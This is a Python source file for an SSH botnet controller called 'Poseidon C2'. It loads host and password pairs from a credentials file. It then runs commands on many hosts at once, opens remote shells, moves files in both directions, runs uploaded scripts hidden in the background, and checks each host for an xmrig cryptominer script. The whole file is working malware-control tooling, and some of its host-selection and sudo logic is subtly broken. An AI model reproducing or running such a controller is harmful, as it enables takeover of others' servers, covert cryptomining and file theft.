#!/usr/bin/env python
import sys
import warnings
import readline, glob
import os 

from fabric.api import *
from termcolor import colored
from fabric.tasks import execute
from prettytable import PrettyTable

running_hosts={}

def complete(text, state):
    return (glob.glob(text+'*')+[None])[state]

readline.set_completer_delims(' \t\n;')
readline.set_completer(complete)
warnings.simplefilter("ignore", UserWarning)

os.system("clear") 
print(" __________                   .__    .___            _________  ________ ")
print(" \______   \____  ______ ____ |__| __| _/____   ____ \_   ___ \ \_____  \ ")
print(" |     ___/  _ \/  ___// __ \|  |/ __ |/  _ \ /    \/    \  \/  /  ____/ ")
print(" |    |  (  <_> )___ \\  ___/|  / /_/ (  <_> )   |  \     \____/       \ ")
print(" |____|   \____/____  >\___  >__\____ |\____/|___|  /\______  /\_______ \ ")
print("                    \/     \/        \/           \/        \/         \/")
print("")
print("")
print("")
print("       =[ Poseidon C2v1.0-dev                                            ]")
print("+ -- --=[ 0 exploits - 0 auxilary                                        ]")
print("+ -- --=[ 0 payloads 0 encoders                                          ]")
print("+ -- --=[ 0 evasion                                                      ]")


@parallel
def check_hosts(silent=True): 
    print(colored("\n[!] Loading hosts...\n", "yellow", attrs=["bold"]))
    with settings(hide('warnings', 'running', 'stdout', 'stderr')):
        host_results = execute(run_command,"uname -s -n || echo 'Unknown'", hosts=env.hosts)
        for host, result in host_results.items():
            if result != "Error":
                running_hosts[host] = result[:result.find("#")]
            else: 
                running_hosts[host] = "Host Down"
    print(colored("\n[+] Host List Updated\n", "green", attrs=["bold"])) if not silent else None

@parallel
def active_hosts(): 
    table = PrettyTable(["ID", "Host", "Status", "xmrig.sh"])
    flag = 0
    print(colored("[!] Please wait !", "yellow", attrs=["bold"]))
    with settings(hide('warnings', 'running', 'stdout', 'stderr')):
        results = execute(run_command, "uptime -p 2>/dev/null || echo 'Unknown'", hosts=env.hosts) 
        xmrig = execute(run_command, "ls ~/modules/SERVER/xmrig.sh 2>/dev/null && echo 1 || echo 0", hosts=env.hosts)
        for idx, host in enumerate(results):
            if running_hosts[host] != "Host Down":   
                uptime = results[host]
                xmrig_sh = "Yes" if xmrig[host] == "1" else "No"
                table.add_row([colored(str(idx), 'yellow', attrs=['bold']),
                               colored(host, 'green', attrs=['bold']),
                               colored(uptime, 'magenta', attrs=['bold']),
                               colored(xmrig_sh, 'magenta', attrs=['bold'])])
                flag = 1
    if flag == 1:
        print(colored("\n[+] Active Hosts:\n", "green", attrs=['bold']))
        print(table)
    else:
        print(colored("[X] No active hosts\n", "red", attrs=['bold']))


def list_hosts():
    table = PrettyTable(["ID", "Host", "SysInfo"])
    with settings(hide('warnings', 'running', 'stdout', 'stderr')):
        for idx, host in enumerate(env.hosts):
            sys_info = running_hosts[host]
            table.add_row([colored(str(idx), 'yellow', attrs=['bold']),
                           colored(host, 'green', attrs=['bold']),
                           colored(sys_info, 'magenta', attrs=['bold'])])
    print("\nHosts:\n")
    print(table)

def get_hosts():
    selected_hosts = []
    print(colored("[+] Hosts id (0 1 2... / all) [default is all]: ", "green", attrs=["bold"]), end="")
    tmp = input()
    if tmp == "" or tmp == "all":
        selected_hosts = env.hosts
    else:
        for num in tmp.split(): 
            selected_hosts.append(env.hosts[int(num)])
        return selected_hosts


@parallel
def run_command(command): 
    try:
        with settings(hide('warnings', 'running', 'stdout', 'stderr')):
            if command.strip()[0:5] == "sudo":
                results = sudo(command)
            else:
                results = run(command)
    except:            
        results = 'Error'        
    return results
 

def download(): 
    print(colored("[+] Remote path: ", "green", attrs=["bold"]), end="")
    remote_path = input()
    readline.parse_and_bind("tab: complete")     
    local_path = input("Local path: ")
    readline.parse_and_bind('set disable-completion on') 
    get(remote_path, local_path)
    print(colored("[+] Download Completed\n","green", attrs=["bold"]))


def upload(): 
    readline.parse_and_bind("tab: complete")
    print(colored("[+] Local path: ", "green", attrs=["bold"]), end="") 
    local_path = input()
    readline.parse_and_bind('set disable-completion on') 
    print(colored("[+] Remote path: ", "green", attrs=["bold"]), end="")
    remote_path = input()
    remote_path_dir = remote_path[:remote_path.rfind("/")] 
    run('mkdir -p %s'%remote_path_dir)           
    put(local_path, remote_path)
    print(colored("[+] Upload Completed\n", "green", attrs=["bold"])) 


@parallel
def background_run(command):
    command = 'nohup %s &> /dev/null &' % command
    run(command, pty=False)

@parallel
def scripts_exec(local_path):
    put(local_path, "/tmp/script.fabric", mode=0o755)
    background_run('/tmp/script.fabric')

from termcolor import colored

@parallel
def mass_command():
    print(colored("[+] Command to execute: ", "green", attrs=["bold"]), end="")
    cmd = input()
    try:
        with settings(hide('warnings', 'running', 'stdout', 'stderr')):
            for host, result in execute(run_command, cmd, hosts=get_hosts()).items():
                print("\n" + colored("[" + host + "]: " + cmd, "green", attrs=["bold"]))
                print(colored(('-' * 80), "yellow", attrs=["bold"]) + '\n' + colored(result, "magenta", attrs=["bold"]) + '\n')
    except KeyboardInterrupt:
        print("")           
        sys.exit()
    except:
        print(colored("[X] Invalid host id\n","red", attrs=["bold"]))          

def interactive_shell():
    print(colored("[+] Host id: ", "green", attrs=["bold"]), end="")
    host = int(input())
    try:
        execute(open_shell, host=env.hosts[host])
    except KeyboardInterrupt:
        print("")
        sys.exit()
    except:
        print(colored("[X] Invalid host id\n","red", attrs=["bold"]))

import subprocess

def script_exec():
    hosts_list = get_hosts()
    readline.parse_and_bind("tab: complete")
    print(colored("[+] Local path: ", "green", attrs=["bold"]), end="")
    local_path = input()
    readline.parse_and_bind('set disable-completion on')
    with settings(hide('warnings', 'running', 'stdout', 'stderr')):
        execute(scripts_exec, local_path, hosts=hosts_list)
        print(colored("[+] Execution Completed\n","green", attrs=["bold"]))

def db_script():
    script_path = os.path.abspath('modules/DBD/DBExplorer.py')
    script_dir = os.path.dirname(script_path)
    os.chdir(script_dir)
    os.system('python3 DBExplorer.py')

def menu():
    for num, desc in enumerate(["List Hosts", "Active Hosts", "Update Hosts", "Run Command", "Open Shell", "File Upload", "File Download", "Script Exec","DBDExplorer", "Exit"]):
        index = colored(str(num), 'yellow', attrs=['bold'])
        description = colored(desc, 'white', attrs=['bold'])
        print(index + " " + description)
    try: 
        print()
        print(colored("PoseidonC2", 'white', attrs=['bold']) +
              colored("(module)", 'red', attrs=['bold']) + 
              colored(">", 'white', attrs=['bold']), end=" ")

                       
        choice = int(input())
    except KeyboardInterrupt:
        print("")       
        sys.exit()      
    except:
        choice = 0
    return choice


def work():
    choice = menu()
    options = {
        0: list_hosts,                                  
        1: active_hosts,
        2: lambda: check_hosts(silent=False), 
        3: mass_command,
        4: interactive_shell,
        5: lambda: execute(upload, hosts=get_hosts()),
        6: lambda: execute(download, hosts=get_hosts()),
        7: script_exec,
        8: db_script,
        9: sys.exit,
    }
    while True:
        if choice in options:
            options[choice]()
        choice = menu()

def read_file():
    with open("modules/SERVER/creds.txt", "r") as credentials:
        data = credentials.readlines()
        for line in data:
            host, password = line.strip().split() if ' ' in line else (line.strip(), None)
            host = f"{host}:22" if ':' not in host else host
            env.hosts.append(host)
            if password:
                env.passwords[host] = password
    env.skip_bad_hosts = True
    env.timeout = 2
    env.warn_only = True
    env.connection_attempts = 1




def main():
    read_file()
    check_hosts()
    work()


if __name__ == '__main__':
    main()
